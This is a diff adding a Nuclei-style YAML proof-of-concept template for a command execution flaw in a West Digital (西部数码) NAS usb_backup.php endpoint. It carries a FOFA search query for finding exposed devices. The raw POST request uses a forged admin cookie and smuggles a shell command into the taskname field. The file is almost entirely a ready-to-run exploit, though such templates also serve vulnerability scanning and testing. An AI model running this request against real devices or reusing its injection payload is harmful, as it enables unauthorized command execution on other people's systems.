@@ -1,0 +1,28 @@
+id: poc-trvkwn9pe6umkhc8
+info:
+  name: 西部数码 NAS usb_backup.php 存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/trvkwn9pe6umkhc8'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: trvkwn9pe6umkhc8
+    fofa: 'icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"'
+http:
+- raw:
+  - 'POST /web/backups/usb_backup.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: isAdmin=1;username=admin
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    action=create&taskname='' $(pwd>/var/www/t.png) #'' &source_dir[]='
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
